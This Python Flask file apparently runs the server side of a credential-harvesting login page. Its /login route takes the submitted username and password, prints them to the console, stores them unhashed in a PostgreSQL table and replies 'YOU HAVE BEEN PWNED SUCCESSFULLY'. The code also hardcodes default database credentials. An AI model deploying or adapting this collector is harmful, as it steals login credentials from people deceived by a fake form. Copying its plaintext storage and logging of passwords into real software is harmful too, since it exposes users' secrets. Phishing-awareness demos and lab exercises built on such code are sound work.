from flask import Flask, request, send_from_directory
import psycopg2
import os

app = Flask(__name__)
PORT = int(os.environ.get("PORT", 3000))

# PostgreSQL connection
conn = psycopg2.connect(
    dbname="postgres",
    user="postgres",
    password="postgres",
    host="localhost",
    port="5432"
)
cursor = conn.cursor()

# Crear tabla si no existe
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
);
""")
conn.commit()

# Ruta para archivos estáticos desde "public"
@app.route('/public/<path:filename>')
def serve_static(filename):
    return send_from_directory('public', filename)

# Ruta para el archivo HTML (index.html en la raíz)
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# Ruta POST para login usando formulario HTML
@app.route('/login', methods=['POST'])
def login():
    print("POST /login")
    username = request.form.get("username")
    password = request.form.get("password")
    print("Form Data:", username, password)

    if not username or not password:
        return "Username and password are required", 400

    try:
        cursor.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, password))
        conn.commit()
        return "YOU HAVE BEEN PWNED SUCCESSFULLY 💅", 200
    except Exception as e:
        print("Error saving user:", e)
        conn.rollback()
        return "Error saving user to database", 500

if __name__ == '__main__':
    app.run(port=PORT)
